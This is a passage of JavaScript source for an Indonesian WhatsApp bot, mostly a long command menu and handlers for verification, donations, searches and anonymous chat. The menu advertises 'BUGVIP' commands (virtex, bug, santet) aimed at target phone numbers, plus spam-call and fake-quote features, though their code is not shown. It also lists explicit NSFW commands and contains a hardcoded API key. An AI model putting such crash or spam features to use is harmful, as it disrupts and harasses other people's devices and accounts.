    • Library : 𝗕𝗮𝗶𝗹𝗲𝘆𝘀-𝗠𝗗
    • Time : ${jam} WIB
    • Date : ${tanggal}
    • Terdaftar : ${("id", db_user).length}
    • Room Chat : ${db_menfes.length}
    ${strip_ny}

     *⫍* 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨 *⫎*
   〆 .simi    
   〆 .toimg
   〆 .tes
   〆 .runtime
   〆 .ping
   〆 .toimg
   〆 .sticker
   〆 .infoupdate
   〆 .groupbot
   〆 .request
   〆 .donasi
   〆 .donate

   *⫍* 𝗔𝗡𝗢𝗡𝗬𝗠𝗢𝗨𝗦 𝗖𝗛𝗔𝗧 *⫎*
   〆 .chat
   〆 .skip
   〆 .start
   〆 .secret
   〆 .confess
   〆 .menfess
   〆 .secretchat
   〆 .stopchat

   *⫍ MENFESS MENU ⫎*
   〆 .confess
   〆 .menfess _628xx|Nama|Pesan_

   *⫍* 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 *⫎*
   〆 .error
   〆 .runtime
   〆 .session
   〆 .resetdb
   〆 .addprem _@tag / 628xxx_
   〆 .delprem _@tag / 628xxx_
   〆 .join  _<link group>_
   〆 .datauser
   〆 .broadcast
   〆 .bctext
   〆 .bcvidio
   〆 .bcimage
   〆 .bcgambar
   〆 .bcaudio
   〆 .creategc
   〆 .buatgroup
   〆 .block
   〆 .unblock

   *⫍ PREMIUM MENU ⫎*
   〆 .jadibot
   〆 .listjadibot
   〆 .spamCall

   *⫍ SEARCH MENU ⫎*
    〆 .pinteseret
    〆 .wikimedia 
    〆 .wallpaper
    〆 .komikku
    〆 .happymod
    〆 .infogempa
    〆 .jadwaltv
    
   *⫍* 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿 𝗠𝗘𝗡𝗨 *⫎*
    〆 .tiktok
    〆 .gitclone
    〆 .mediafire

   *⫍ INFORMATION MENU ⫎*
    〆 .jadwaltv
    〆 .tv
    〆 .infogampa
    〆 .gempa
    〆 .bioskop
    
   *⫍ CONVERT MENU⫎*
    〆 .tourl
    〆 .nulis
    〆 .toimg
    〆 .sticker
    〆 .s

  *⫍ GAME MENU⫎*
    〆 .caklontong
    〆 .tebakgambar
    〆 .tebakkata
    〆 .tekateki
    〆 .asahotak
    〆 .tebakkalimat
    〆 .tebakbendera
    〆 .siapakahaku
    〆 .susunkata
    〆 .tebaklirik
    〆 .tebakkimia
    〆 .tebaktebakan
   
   *⫍* 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨 *⫎*
   〆 .hidetag
   〆 .tagall
   〆 .fitnah
   〆 .delete
   〆 .revoke
   〆 .linkgrup
   〆 .linkgc
   〆 .setdesc
   〆 .antilink _on_
   〆 .antilink _off_
   〆 .demote
   〆 .promote
   〆 .setppgrup
   〆 .kick     _@tag_
   〆 .setnamegc
   〆 .group _open_
   〆 .group _close_
   〆 .welcome _on_
   〆 .welcome _off_
 
   *⫍* 𝗦𝗧𝗔𝗟𝗞𝗘𝗥 𝗠𝗘??𝗨 *⫎*
   〆 .ffstalk *id*
   〆 .mlstalk *id|zone*
   〆 .npmstalk *packname*
   〆 .githubstalk *username*

   *⫍* 𝗞𝗔𝗟𝗞𝗨𝗟𝗔𝗧𝗢𝗥 *⫎*
   〆 .kali _angka angka_
   〆 .bagi _angka angka_
   〆 .kurang _angka angka_
   〆 .tambah _angka angka_

   *⫍* 𝗦𝗧𝗢𝗥𝗘 𝗠𝗘𝗡𝗨 *⫎*
   〆 .list _<only grup>_
   〆 .addlist _key@pesan_
   〆 .dellist _<options>_
   〆 .update _key@pesan_
   〆 .proses _<reply orderan>_
   〆 .done _<reply orderan>_

   *⫍* 𝘼𝙐𝘿𝙄𝙊 𝘾𝙃𝘼𝙉𝙂𝙀𝙍 *⫎*
   〆 .tupai
   〆 .robot
   〆 .blown
   〆 .smooth
   〆 .fat
   〆 .fast
   〆 .slow
   〆 .bass
   〆 .deep
   〆 .reverse
   〆 .nightcore

   *⫍ ASUPAN MENU ⫎*
   〆 .rikagusriani
   〆 .bocil
   〆 .geayubi
   〆 .santuy
   〆 .ukhty
   〆 .asupan
   〆 .delvira
   〆 .ayu
   〆 .bunga
   〆 .aura
   〆 .chika
   〆 .nisa
   〆 .ziva
   〆 .yana
   〆 .viona
   〆 .syania
   〆 .riri
   〆 .syifa
   〆 .mama_gina
   〆 .alcakenya
   〆 .mangayutri


    *⫍ NSFW MENU ⫎*
   〆 .baka
   〆 .smug
   〆 .neko_sfw
   〆 .hentai_gif
   〆 .spank
   〆 .blowjob
   〆 .cumarts
   〆 .eroyuri
   〆 .eroneko
   〆 .erokemonomimi
   〆 .erokitsune
   〆 .ero
   〆 .feet
   〆 .erofeet
   〆 .feetgif
   〆 .femdom
   〆 .futanari
   〆 .hentai
   〆 .holoero
   〆 .holo
   〆 .keta
   〆 .kitsune
   〆 .kemonomimi
   〆 .pussyart
   〆 .pussywankgif
   〆 .girl_solo
   〆 .girl_solo_gif
   〆 .tits
   〆 .trap
   〆 .yuri
   〆 .avatar2
   〆 .anal
   〆 .bj
   〆 .boobs
   〆 .classic
   〆 .cumsluts
   〆 .kuni
   〆 .lesbian
   〆 .neko
   〆 .neko_gif
   〆 .ahegao
   〆 .bdsm
   〆 .cuckold
   〆 .cum
   〆 .foot
   〆 .gangbang
   〆 .glasses
   〆 .jahy
   〆 .masturbation
   〆 .nsfw_neko
   〆 .orgy
   〆 .panties
   〆 .tentacles
   〆 .thighs
   〆 .zettai

   *⫍* 𝙎𝙊𝙐𝙉𝘿 𝗠𝗘𝗡𝗨 *⫎* 
    〆 .sound1
    〆 .sound2
    〆 .sound3
    〆 .sound4
    〆 .sound5
    〆 .sound6
    〆 .sound7
    〆 .sound8
    〆 .sound9
    〆 .sound10
    〆 .sound11
    〆 .sound12
    〆 .sound13
    〆 .sound14
    〆 .sound15
    〆 .sound16
    〆 .sound17
    〆 .sound18
    〆 .sound19
    〆 .sound20
    〆 .sound21
    〆 .sound22
    〆 .sound23
    〆 .sound24
    〆 .sound25
    〆 .sound26
    〆 .sound27
    〆 .sound28
    〆 .sound29
    〆 .sound30
    〆 .sound31
    〆 .sound32
    〆 .sound33
    〆 .sound34
    〆 .sound35
    〆 .sound36
    〆 .sound37
    〆 .sound38
    〆 .sound39
    〆 .sound40
    〆 .sound41
    〆 .sound42
    〆 .sound43
    〆 .sound44
    〆 .sound45
    〆 .sound46
    〆 .sound47
    〆 .sound48
    〆 .sound49
    〆 .sound50

   *⫍* 𝙁𝙐𝙉 𝗠𝗘𝗡𝗨 *⫎* 
   〆 .baikcek
   〆 .jahatcek
   〆 .anjingcek
   〆 .haramcek
   〆 .pakboycek
   〆 .pakgirlcek
   〆 .sangecek 
   〆 .bapercek
   〆 .fakboycek
   〆 .alimcek
   〆 .suhucek
   〆 .fakgirlcek
   〆 .kerencek
   〆 .wibucek
   〆 .goblokcek 
   〆 .jelekcek 
   〆 .gaycek
   〆 .lesbicek
   〆 .gantengcek 
   〆 .cantikcek
   〆 .begocek 
   〆 .suhucek
   〆 .pintercek
   〆 .jagocek
   〆 .nolepcek
   〆 .babicek
   〆 .bebancek

   *⫍ PRIMBON ⫎*
   〆 .artinama
   〆 .artimimpi
   〆 .ceknama
   〆 .kecokokannama
   〆 .ramaljodohbali
   〆 .suamiistri
   〆 .sifatusaha
   〆 .ramalanjodoh
   〆 .ramalancinta
   〆 .rezeki
   〆 .pekerjaan
   〆 .ramalnasib
   〆 .potensipenyakit
   〆 .tarot
   〆 .fengsui
   〆 .haribaik
   〆 .harisangar
   〆 .harisial
   〆 .harinaga
   〆 .arahrezeki
   〆 .peruntungan
   〆 . sifat
   〆 .karakter
   〆 .wetonjawa
   〆 .memancing
   〆 .masakubur
   〆 .keberuntungan
   
   *⫍* 𝙍𝘼𝙉𝘿𝙊𝙈 𝙄𝙈𝘼𝙂𝙀 *⫎*
    〆 .boneka
    〆 .cecan
    〆 .cogan
    〆 .darkjokes
   〆 .ppcouple

   *⫍ TEXTPRO MENU 1⃣⫎*
    〆 .metallic 
    〆 .naruto 
    〆 .butterfly 
    〆 .flaming 
    〆 .pencil
    〆 .thunder
    〆 .neon
    〆 .glich
    〆 .berry
    〆 .logobear
    〆 .3dboxtext
   〆 .halloween2
   〆 .blackpink
   〆 .rainbow2
   〆 .water_pipe
   〆 .halloween
   〆 .sketch
   〆 .sircuit
   〆 .discovery
   〆 .metallic2
   〆 .fiction
   〆 .demon
   〆 .transformer
   〆 .berry
   〆 .thunder
   〆 .magma
   〆 .3dstone
   〆 .neon
   〆 .glitch
   〆 .harry_potter
   〆 .embossed
   〆 .broken
   〆 .papercut
   〆 .gradient
   〆 .glossy
   〆 .watercolor
   〆 .multicolor
   〆 .neon_devil
   〆 .underwater
   〆 .bear
   〆 .wonderfulg
   〆 .christmas
   〆 .neon_light
   〆 .snow
   〆 .cloudsky
   〆 .luxury2
   〆 .gradient2
   〆 .summer
   〆 .writing
   〆 .engraved
   〆 .summery
   〆 .3dglue
   〆 .metaldark
   〆 .neonlight
   〆 .oscar
   〆 .minion
   〆 .holographic
   〆 .purple
   〆 .glossyb
   〆 .deluxe2
   〆 .glossyc
   〆 .fabric
   〆 .neonc
   〆 .newyear
   〆 .newyear2
   〆 .metals
   〆 .xmas
   〆 .blood
   〆 .darkg
   〆 .joker
   〆 .wicker
   〆 .natural
   〆 .firework
   〆 .skeleton
   〆 .balloon
   〆 .balloon2
   〆 .balloon3
   〆 .balloon4
   〆 .balloon5
   〆 .balloon6
   〆 .balloon7
   〆 .steel
   〆 .gloss
   〆 .denim
   〆 .decorate
   〆 .decorate2
   〆 .peridot
   〆 .rock
   〆 .glass
   〆 .glass2
   〆 .glass3
   〆 .glass4
   〆 .glass5
   〆 .glass6
   〆 .glass7
   〆 .glass8
   〆 .captain_as2
   〆 .robot
   〆 .equalizer
   〆 .toxic
   〆 .sparkling
   〆 .sparkling2
   〆 .sparkling3
   〆 .sparkling4
   〆 .sparkling5
   〆 .sparkling6
   〆 .sparkling7
   〆 .decorative
   〆 .chocolate
   〆 .strawberry
   〆 .koifish
   〆 .bread
   〆 .matrix
   〆 .blood2
   〆 .neonligth2
   〆 .thunder2
   〆 .3dbox
   〆 .neon2
   〆 .roadw
   〆 .bokeh
   〆 .gneon
   〆 .advanced
   〆 .dropwater
   〆 .wall
   〆 .chrismast
   〆 .honey
   〆 .drug
   〆 .marble
   〆 .marble2
   〆 .ice
   〆 .juice
   〆 .rusty
   〆 .abstra
   〆 .biscuit
   〆 .wood
   〆 .scifi
   〆 .metalr
   〆 .purpleg
   〆 .shiny
   〆 .jewelry
   〆 .jewelry2
   〆 .jewelry3
   〆 .jewelry4
   〆 .jewelry5
   〆 .jewelry6
   〆 .jewelry7
   〆 .jewelry8
   〆 .metalh
   〆 .golden
   〆 .glitter
   〆 .glitter2
   〆 .glitter3
   〆 .glitter4
   〆 .glitter5
   〆 .glitter6
   〆 .glitter7
   〆 .metale
   〆 .carbon
   〆 .candy
   〆 .metalb
   〆 .gemb
   〆 .3dchrome
   〆 .metalb2
   〆 .metalg
    
   *⫍ TEXTPRO MENU 2️⃣⫎*
    〆 .gtiktok
    〆 .stone
    〆 .marvel
    〆 .marvel2
    〆 .pornhub
    〆 .avengers
    〆 .metalr
    〆 .metalg
    〆 .metalg2
    〆 .lion
    〆 .wolf_bw
    〆 .wolf_g
    〆 .ninja
    〆 .3dsteel
    〆 .horror2
    〆 .lava
    〆 .bagel
    〆 .horror
    〆 .game8bit
    〆 .layered
    〆 .glitch2
    〆 .coolg
    〆 .coolwg
    〆 .realistic
    〆 .space3d
    〆 .battlegrounds-logo
    〆 .battlefield4
    〆 .text-8bit
    〆 .ninjalogo

   *⫍* 𝙀𝙋𝙃𝙊𝙏𝙊 𝙈𝙀𝙉𝙐 *⫎*
    〆 .youtubegold
    〆 .youtubesilver
    〆 .facebookgold
    〆 .facebooksilver
    〆 .instagramgold
    〆 .instagramsilver
    〆 .twittergold
    〆 .twittersilver
    〆 .retrotext
    〆 .halloweenbats
    〆 .texthalloween
    〆 .cardhalloween
    〆 .birthdaycake
    〆 .thundertext
    〆 .icetext
    〆 .milkcake
    〆 .snowontext
    〆 .metalstar
    〆 .dragonfire
    〆 .zombie3d
    〆 .merrycard
    〆 .generalexam
    〆 .viettel
    〆 .embroider
    〆 .graffititext
    〆 .graffititext2
    〆 .graffititext3
    〆 .covergraffiti
    〆 .moderngold
    〆 .capercut
    〆 .lovecard
    〆 .heartflashlight
    〆 .heartcup
    〆 .sunglightshadow
    〆 .graffiti3d
    〆 .moderngoldsilver
    〆 .moderngold2
    〆 .modengold3
    〆 .fabrictext
    〆 .masteryavatar
    〆 .messagecoffee
    〆 .announofwin
    〆 .writeblood
    〆 .horrorletter
    〆 .writehorror
    〆 .shirtclub
    〆 .angelwing
    〆 .christmasseason
    〆 .projectyasuo
    〆 .lovelycute
    〆 .womansday
    〆 .covergamepubg
    〆 .nameonheart
    〆 .funnyhalloween
    〆 .lightningpubg
    〆 .greetingcardvideo
    〆 .christmascard
    〆 .galaxybat
    〆 .writegalaxy
    〆 .starsnight
    〆 .noeltext
    〆 .textcakes
    〆 .pubgbirthday
    〆 .galaxywallpaper
    〆 .pubgglicthvideo
    〆 .pubgmascotlogo
    〆 .realembroidery
    〆 .vintagetelevision
    〆 .funnyanimations
    〆 .glowingtext
    〆 .textonglass
    〆 .cartoonstyle
    〆 .multicolor
    〆 .watercolor2
    〆 .textsky
    〆 .summerbeach
    〆 .1917text
    〆 .puppycute
    〆 .rosebirthday


      *⫍* 𝗕𝗨𝗚𝗩𝗜𝗣 𝗠𝗘𝗡𝗨 *⫎*
   〆 .philips *628xxx*
   〆 .philips2 *628xxx*
   〆 .philips3 *628xxx*
   〆 .santet *@tag*
   〆 .santet2 *@tag*
   〆 .santet3 *@tag*
   〆 .virtex *628xxx*
   〆 .virtex2 *628xxx*
   〆 .virtex3 *628xxx*
   〆 .bug1 *628xxx*
   〆 .bug2 *628xxx*
   〆 .bug3 *628xxx*
   〆 .bug4 *628xxx*
   〆 .bug5 *628xxx*
   
   
    *⫍ THANKS TO ⫎*
   •Allah Swt
   •Ortu
   •Ramaa gnnz *[Creator]*
   •Lexxy Ofc *[Penyedia Base]*
   •Zeeone Ofc *[Penyedia apikey]*
   •Nata gnz *[Penyedia Apikey]*
   •Ronzz YT *[Support]*
   •${setting.ownerName}
   •And My Subscriber 
`
let buttonmenu = [
{buttonId: '#donasi', buttonText: {displayText: '️䳈 Dᴏɴᴀsɪ'}, type: 1},
{buttonId: '#owner', buttonText: {displayText: '️䳈 Oᴡɴᴇʀ'}, type: 1},
{buttonId: '#groupbot', buttonText: {displayText: '️䳈 GʀᴏᴜᴘBᴏᴛ'}, type: 1}
]
conn.sendMessage(from, { location: { jpegThumbnail: await reSize(fs.readFileSync(`${setting.logoMenu}`), 300, 150) },
caption: menu_nya,
buttons: buttonmenu,
footer: footer_nya,
mentions:[setting.ownerNumber, sender]},
{quoted: msg })
}
break
case 'menu':{
const mark_slebew = '0@s.whatsapp.net'
const more = String.fromCharCode(8206)
const strip_ny = more.repeat(4001)
let bio = (await conn.fetchStatus(sender).catch(console.error) || {}).status || '-'
reply('```Loading..⌛\nTampilan menu sedang diProses dalam 3detik🍁```')
var footer_nya =`Creator by - ${setting.ownerName}`
let tampilan_nya = `╭━━━━━━━━━━━━━━━┅•ิ.•ஐ
│ *${ucapanWaktu} 🌻 @${sender.split('@')[0]}*                             
└┬────────────┾•ิ.•┽
┌┤     【 *BOT INFO🤖* 】
││
││○ *BotName* : ${setting.botName} 
││○ *User* : ${("id", db_user).length}
││○ *Owner* : @${setting.kontakOwner}
││○ *Library* : 𝗕𝗮𝗶𝗹𝗲𝘆𝘀-𝗠𝗗
││○ *Runtime* : ${runtime(process.uptime())}
││
│└────────────┾•ิ.•┽
│      【 *USER INFO👤* 】
│
│○ *Name* : @${sender.split('@')[0]}
│○ *Id* : ${cekUser("name", sender)}
│○ *Bio* : ${bio ? bio : '-'}
│○ *Premium* : (${cekUser("premium", sender)? '✓':'✘'})
│○ *Status* : ${isOwner ? 'Owner' : 'User'} ${setting.botName}
│
├──────────────┾•ิ.•┽
│Saya adalah Bot WhatsApp,
│Kami menyediakan beberapa fitur 
│Gunkanlah fitur dengan bijak,
│ Ketik *#rules* untuk melihat 
│peraturan Bot. Nicee
╰━━━━━━━━━━━━━━━━┅•ิ.•ஐ
`
let btn_menu = [
{buttonId: '#Rules', buttonText: {displayText: '️䳈 Rᴜʟᴇs'}, type: 1},
{buttonId: '#allmenu', buttonText: {displayText: '️䳈 Aʟʟ Mᴇɴᴜ'}, type: 1},
]
conn.sendMessage(from, { caption: tampilan_nya, buttons: btn_menu, footer: footer_nya, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak})
}
break
case 'verify':{
if (cekUser("id", sender) !== null) return reply('Kamu sudah terdaftar !!')
try {
var ppnu = await conn.profilePictureUrl(sender, 'image')
} catch {
var ppnu = 'https://telegra.ph/file/6880771a42bad09dd6087.jpg'
}
var res_us = `${makeid(10)}`
var diacuk = `${db_user.length+1}`
var user_name = `#GRXY${diacuk}`
let object_user = {"id": sender, "name": user_name, "seri": res_us, "premium": false}
db_user.push(object_user)
fs.writeFileSync('./database/pengguna.json', JSON.stringify(db_user))
mentions(`Memproses data user > @${sender.split("@")[0]}`, [sender])
await sleep(1500)
var verify_teks =`───「 𝗧𝗘𝗥𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜 」────

⬣ Name : @${sender.split('@')[0]} 👤
⬣ Id : ${user_name} 🍁
⬣ Seri : ${res_us}  🌼

_Selamat Anda telah Terverifikasi Di database ${setting.botName}_
`
let but_verify = [
{ buttonId: '#menu', buttonText: {displayText: '️䳈 Mᴇɴᴜ'}, type: 1}
]
conn.sendMessage(from, { image: { url: ppnu }, 
caption: verify_teks,
footer: 'Ramaa-gnnz',
buttons: but_verify,
mentions: [sender]},
{quoted: msg })
await sleep(1000)
var teksss_verify =`𝙍𝙀𝙂𝙄𝙎𝙏𝙀𝙍 𝙐𝙎𝙀𝙍
○ Name : @${sender.split('@')[0]} 👤
○ Seri : ${res_us} 🍁
○ Id : ${user_name} ✉️
○ Terdaftar : ${db_user.length} 🎖️`
conn.sendMessage(`${setting.ownerNumber}`, {text:teksss_verify, mentions: [sender]})
}
break
case 'infoupdate':
reply('Cek YouTube : https://youtube.com/@ramaagnnz961')
break
case 'script': case 'sc':
reply(`_-----SCRIPT BOT MD-----_

-Script Ini di jual Dengan harga yang Cukup Murah
Kalian bisa membelinya
Dengan Harga *Rp 50.000* 
 
*Whatsapp Admin*
Wa.me/6285791220179
 
 || Keterangan ||
 •Sudag termasuk Pengajaran
 •No enc 100%
 •Fitur Yang menarik
•Dan masih Banyak lagi

 Jika berminat Chat
Wa.me/6285791220179
`)
break
case 'owner':{
var owner_Nya = setting.ownerNumber
sendContact(from, owner_Nya, setting.ownerName, msg)
reply('*Itu kak nomor owner ku, Chat aja gk usah malu😆*')
}
break
case 'grupbot':
case 'groupbot':
case 'gcbot':
reply(`*${setting.judulGroup}*
${setting.linkGroup}\nAtuhi Peraturannya Ya kak😆`)
break
case 'rules':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
let text_rules =`*──「 RULES-BOT 」──*

1. Dilarang spam bot✉️. 
Sanksi: *BLOCK*
2. Dilarang Call bot📞.
Sanksi: *BLOCK*
3. Jangan Mengina bot📣.
Sanksi: *PERMANENT BLOCK*

🗯️ Bot tidak atau lambat merespon ?
➡️ Mungkin dipengaruhi oleh jaringan, signal, banned oleh Whatsapp dan beberapa asalan.

🗯️ Dimana saya bisa mendapatkan Script dari bot ini ?
➡️ Script ini bisa kalian dapatkan Dengan membeli Ke 
Wa.me//6285791220179

🗯️ Boleh saya menambah ke grup?
➡️ Untuk itu tergantung dari owner bot sendiri`

let buton = [
{ buttonId: `#menu`, buttonText: { displayText: '䳈 Mᴇɴᴜ' }, type: 1 },
]
conn.sendMessage(from, { text: text_rules, buttons: buton })
}
break
case 'donasi': case 'donate':{
let tekssss = `───「  *DONASI*  」────
Hallo @${sender.split('@')[0]} 👋

*Payment donasi💰* 

- *Dana :* ${setting.dana}
- *Gopay :* ${setting.gopay}
- *Ovo :* ${setting.ovo}
- *Saweria :* ${setting.saweria}
- *Qris :* Scan qr di atas

berapapun donasi dari kalian itu sangat berarti bagi kami 
`
let button = [
{ buttonId: `#menu`, buttonText: { displayText: '䳈 Mᴇɴᴜ' }, type: 1 },
{ buttonId: `#owner`, buttonText: { displayText: '䳈 Oᴡɴᴇʀ' }, type: 1 },
]
conn.sendMessage(from, { image: fs.readFileSync(`${setting.qrisNya}`),
 caption: tekssss, 
footer: `${setting.ownerName} © 2022`,
buttons: button},
{ quoted: msg })
}
break
case 'requestfitur':
case 'request':
case 'reqfitur': 
if (!q) return reply(`Ex : ${prefix+command} Fitur Yang Ingin Di Tambahkan\n\nContoh :\n${prefix+command} Bang Tambahin Fitur Tictactoe`)
let pesan_request = q.split(' ')[0] ? q.split(' ')[0] : ''
if (pesan_request.length <1) return reply(`_*Contoh*_\n${prefix+command} bang tambahin fitur jadibot`)
reply('Suscess.., Permintaan mu Sudah terkirim Ke Owner Script')
let text_request =`*| REQUEST |*\n`
text_request +=`Dari : ${sender.split('@')[0]}\n`
text_request +=`Request Nya : ${pesan_request}`
conn.sendMessage(`${setting.ownerNumber}`, {text: text_request}, {quoted:fkontak})
break
case 'ppcp':
case 'ppcouple':
case 'couplepp':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
let data = fs.readFileSync('./sticker/ppcouple.js');
let  jsonData = JSON.parse(data);
let randIndex = Math.floor(Math.random() * jsonData.length);
let json = jsonData[randIndex];
let randCowo= await getBuffer(json.cowo)
conn.sendMessage(from, { image: randCowo, caption: '*Nihh Cowok nya👨*' }, { quoted: msg })
let randCewe = await getBuffer(json.cewe)
conn.sendMessage(from, { image: randCewe, caption: '*Nihh Cewek nya 👩*' }, { quoted: msg })
} 
break

case 'wikimedia':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply('Contoh:\n#wikimedia Trend 2023')
fetchJson(`https://saipulanuar.ga/api/search/wikimedia?query=${q}&apikey=jPHjZpQF`)
.then(wk =>{
var text_wikimedia =`*│WIKIMEDI . COM│*
*Pangkat:* ${wk.result.title}
*Link Wiki:* ${wk.result.source}
*Website:* wikimedia`
conn.sendMessage(from, { image:{url:wk.result.image}, caption:text_wikimedia}, {quoted:msg})
})
}
break
case 'pinterest':
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply(`Contoh:\n${prefix+command} loli`)
reply(mess.wait)
fetchJson(`https://saipulanuar.ga/api/search/pinterest?query=${q}&apikey=jPHjZpQF`)
.then(pin =>{
var media = pickRandom(pin.result)
conn.sendMessage(from, { image:{url:media}, caption:`Done *${q}*`}, {quoted:msg})
})
break
case 'git': case 'gitclone':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!q) return reply('link githubnya mana?\n*Contoh:*\n#gitclone https://github.com/zeeone-ofc/Alphabot-Md')
var linknya = q
if (!regex1.test(linknya)) return reply('link salah!')
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
reply(`*Mohon tunggu, sedang mengirim repository..*`)
conn.sendMessage(from, { document: { url: url }, fileName: filename, mimetype: 'application/zip' }, { quoted: msg }).catch((err) => reply('Maaf link github yang kamu berikan di private, dan tidak bisa di jadikan file'))
}
break
case 'komikku':
case 'komiku':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply(`Ex : ${prefix+command} Judul Komik\n\nContoh :\n${prefix+command} Attack On Titan`)
reply(mess.wait)
komiku(q).then(async anu =>{
let result = anu[Math.floor(Math.random(), anu.length)]
let gam = await getBuffer(result.image)
conn.sendMessage(from, { location: { jpegThumbnail: await reSize(gam, 300, 150) }, caption: `⭔Title : ${result.title}\n⭔Indo : ${result.indo}\n⭔Update : ${result.update}\n⭔Deskripsi : ${result.desc}\n⭔Chapter Awal : ${result.chapter_awal}\n⭔Chapter Akhir : ${result.chapter_akhir}\n⭔Link : ${result.link}`, footer: `${botName} © 2022` }, { quoted: msg })
}) 
}
break
case 'happymod': {
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply(`Example : ${prefix+command} mobile legend`)
yogipw.happymod(q).then(async(res) => {
teks = '```「 HappyMod  」```'
for (let i of res) {
teks += `\n\n${i.name}\n`
teks += `${i.link}`
}
reply(teks)
})
}
break
case 'gcwa':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
if (!q) return reply(`_Contoh_\n${prefix+command} nama group`)
let bear = await fetchJson(`https://saipulanuar.ga/api/download/linkwa?query=${q}`)
var bearr = bear.result[Math.floor(Math.random() * bear.result.length)]
var bearrr = `*「 SEARCH GROUP 」*\n\n*Name :* ${bearr.nama}\n*Link group:* ${bearr.link}`
reply(bearrr)
}
break

//»»————- ★ INFORMATUON MENU ★————-««

case 'infogempa':{
if (cekUser("id", sender) == null) return conn.sendMessage(from, { text: mess.OnlyUser, buttons: [{ buttonId: '#verify', buttonText: { displayText: 'Verify' }, type: 1 }], footer: `Powerd By - @${setting.kontakOwner}`, mentions: [setting.ownerNumber, sender]}, { quoted: fkontak })
fetchJson(`https://saipulanuar.ga/api/info/gempa?apikey=jPHjZpQF`)
.then(xg =>{
reply(`「 *_INFO GEMPA🌍_*」

*📅 Tanggal:* ${xg.result.tanggal}
*⏰ Jam:* ${xg.result.jam}
*📃 Datetime:* ${xg.result.datetime}
*📍 Coordinates:* ${xg.result.coordinates}
*🌐 Lintang:* ${xg.result.lintang}
*🌐 Bujur:* ${xg.result.bujur}
*⛓️ Magnitude:* ${xg.result.magnitude}
*🚧 Kedalaman:* ${xg.result.kedalaman}
*🚩 Wilayah:* ${xg.result.wilayah}
*💪 Potensi:* ${xg.result.potensi}
*💥 Dirasakan:* ${xg.result.dirasakan}`)
})
}
break
case 'tv':
case 'jadwaltv': {
if (!q) return reply(`Contoh : #${command} Rcti`) 
let tivi = await jadwalTV(q) 
let texoy = `Jadwal TV ${tivi.channel}\n\n`
for (let i of tivi.result) {
texoy += `📅Tanggal : ${i.date}\n`
texoy += `🎤Acara :${i.event}\n\n`
}
reply(texoy) 
}
break
case 'bioskop': {
let skop = await bioskopNow()
let storee = '❉─────── BIOSKOP ──────❉\n'
for (let i of skop ){
storee += `\n*「 *JADWAL BIOSKOP* 」*\n
- *📛Judul* : ${i.title}
- *🔗Link* : ${i.url}\n
- *🧬Genre* : ${i.genre}
- *⌛Durasi* : ${i.duration}
- *📌Tayang di* : ${i.playingAt}\n❉─────── BIOSKOP ──────❉`
reply(storee) 
}
}
break
case 'gempa':
let gempaaa = await gempa() 
let gempanyy = '「 *INFO GEMPA* 」\n'
for (let i of gempaaa){
gempanyy +=`📅>Tanggal : ${i.date}\n📌>Kordinat : ${i.locate}\n⛓️>Magnitude :${i.magnitude}\n📍>Lokasi ${i.location}\n🚧>Daerah bahaya :${i.warning}\n\n`
}
reply(gempanyy)
break

//»»————- ★ MENFESS MENU ★ ————-««

case 'auto_room':{
var id_satu = q.split('|')[0]
var id_dua = q.split('|')[1]
var id_rom = q.split('|')[2]
db_menfes.push({"id": id_satu, "teman": id_dua})
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))
db_menfes.push({"id": id_dua, "teman": id_satu})
fs.writeFileSync('./database/menfess.json', JSON.stringify(db_menfes))
var tulis_pesan = `*BALASS PESAN ✉️*
Ketik pesan apapun kepada bot maka pesan tersebut akan otomatis terkirim ke Orang yang mengirim menfess tersebut,

Klik button stopchat untuk memberhentikan Chat.`
var buttonMessage = {
